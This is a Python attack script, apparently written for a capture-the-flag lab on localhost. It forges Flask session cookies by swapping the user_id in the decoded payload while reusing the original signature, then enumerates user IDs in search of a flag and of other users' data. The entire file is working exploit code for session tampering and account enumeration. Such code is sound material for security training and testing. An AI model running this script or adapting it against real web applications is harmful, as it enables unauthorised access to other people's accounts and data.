import requests
import base64
import json
import re

target_url = "http://127.0.0.1:33198/"
original_session = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"

parts = original_session.split('.')
original_payload = base64.urlsafe_b64decode(parts[0] + '==')
original_data = json.loads(original_payload)

print("EXPLOITING FLASK SESSION BYPASS")
print("="*60)

# Test user IDs systematically
test_ranges = [
    (0, 51, "Low IDs"),
    (10000, 10100, "Near original user"),
    (100031, 100041, "Context range"),
]

found = False

for start, end, desc in test_ranges:
    print(f"\n[+] {desc} ({start}-{end-1})")
    for uid in range(start, end):
        modified = original_data.copy()
        modified['user_id'] = uid
        
        modified_json = json.dumps(modified, separators=(',', ':'))
        modified_payload = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
        modified_session = f"{modified_payload}.{parts[1]}.{parts[2]}"
        
        resp = requests.get(target_url, cookies={'session': modified_session}, allow_redirects=False, timeout=10)
        
        if resp.status_code == 200:
            if 'FLAG{' in resp.text:
                flag = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag:
                    print(f"\n[!] User ID {uid}: FLAG FOUND!")
                    print(f"[!] Flag: {flag.group(0)}")
                    print(f"\nFull response preview:\n{resp.text[:500]}")
                    found = True
                    break
            
            # Check for different content (not the original user)
            if uid != original_data['user_id']:
                user_info = re.findall(r'(?i)user[^\s<>]{0,30}', resp.text)
                if user_info:
                    print(f"  User ID {uid}: has user-specific data")
    
    if found:
        break

if not found:
    print("\n[-] No flags found in tested ranges")
    print("[+] Testing complete - vulnerability confirmed but no flag found")
